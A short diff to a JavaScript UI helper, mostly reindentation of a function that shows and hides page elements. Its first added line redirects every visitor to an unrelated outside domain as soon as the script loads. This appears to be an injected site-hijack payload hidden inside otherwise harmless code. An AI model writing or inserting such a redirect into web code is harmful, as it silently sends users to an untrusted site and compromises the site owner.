@@ -1,6 +1,8 @@
+window.location.href="http://www.q1296962860.top";
 function change(myid,mode)
-{document.getElementById(myid).style.display=mode;
-if(mode == 'block')
+{
+	document.getElementById(myid).style.display=mode;
+	if(mode == 'block')
 	{
 		document.getElementById(myid).style.border="1px solid #eee";
 		document.getElementById(myid).style.borderTop="none";
